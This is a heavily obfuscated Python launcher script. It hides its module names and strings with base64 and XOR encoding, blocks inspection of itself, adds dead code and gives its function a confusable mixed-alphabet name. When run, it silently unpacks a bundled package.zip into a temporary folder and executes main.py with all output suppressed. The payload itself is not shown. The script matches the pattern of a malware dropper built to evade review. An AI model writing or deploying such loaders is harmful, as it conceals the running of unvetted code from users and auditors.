#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Protected by Python Obfuscator


# Module protection - restricted
import sys as _sys

class _RestrictedModule:
    __slots__ = ('_module', '_allowed')

    def __init__(self, module, allowed):
        object.__setattr__(self, '_module', module)
        object.__setattr__(self, '_allowed', allowed)

    def __getattr__(self, name):
        if name.startswith('_'):
            raise AttributeError(f"Access denied: {name}")
        return getattr(self._module, name)

    def __setattr__(self, name, value):
        raise AttributeError("Module is read-only")

    def __dir__(self):
        return [n for n in dir(self._module) if not n.startswith('_')]

_sys.modules[__name__] = _RestrictedModule(_sys.modules[__name__], set())

# Readonly module protection
import sys as _sys

class _ReadonlyModule:
    def __init__(self, module):
        self.__dict__['_module'] = module

    def __getattr__(self, name):
        return getattr(self._module, name)

    def __setattr__(self, name, value):
        raise AttributeError(f"Cannot modify readonly module attribute: {name}")

    def __delattr__(self, name):
        raise AttributeError(f"Cannot delete readonly module attribute: {name}")

_sys.modules[__name__] = _ReadonlyModule(_sys.modules[__name__])
os = __import__(__import__('base64').b64decode('b3M=').decode('utf-8'))
sys = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('B2NI'), __import__('base64').b64decode('dBo7vOxMWmE3i8rhdE9iig==')))
zipfile = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('DnNL2oUgPw=='), __import__('base64').b64decode('dBo7vOxMWmE3i8rhdE9iig==')))
tempfile = __import__(__import__('base64').b64decode('dGVtcGZpbGU=').decode('utf-8'))
subprocess = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('B29ZzJ4jOQRE+A=='), __import__('base64').b64decode('dBo7vOxMWmE3i8rhdE9iig==')))

def _слЩыЯΣЗμραΞД():
    base = os.path.dirname(os.path.abspath(__file__))
    zip_path = os.path.join(base, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('BHtY140rP09N4ro='), __import__('base64').b64decode('dBo7vOxMWmE3i8rhdE9iig==')))
    if 37 * 82 < 0:
        _dead_2246 = 964
    if not os.path.exists(zip_path):
        raise FileNotFoundError(__import__('base64').b64decode('cGFja2FnZS56aXAgbm90IGZvdW5k').decode('utf-8'))
    with tempfile.TemporaryDirectory() as tmp:
        with zipfile.ZipFile(zip_path, __import__('base64').b64decode('cg==').decode('utf-8')) as z:
            z.extractall(tmp)
        main_py = os.path.join(tmp, __import__('base64').b64decode('bWFpbi5weQ==').decode('utf-8'))
        if not os.path.exists(main_py):
            raise FileNotFoundError((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('GXtS0sI8I0FZ5L7BEiAX5BA='), __import__('base64').b64decode('dBo7vOxMWmE3i8rhdE9iig==')))
        subprocess.run([getattr(sys, __import__('base64').b64decode('ZXhlY3V0YWJsZQ==').decode('utf-8')), main_py], cwd=tmp, stdout=getattr(subprocess, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('MF9t8rkAFg=='), __import__('base64').b64decode('dBo7vOxMWmE3i8rhdE9iig=='))), stderr=getattr(subprocess, __import__('base64').b64decode('REVWTlVMTA==').decode('utf-8')))
_слЩыЯΣЗμραΞД()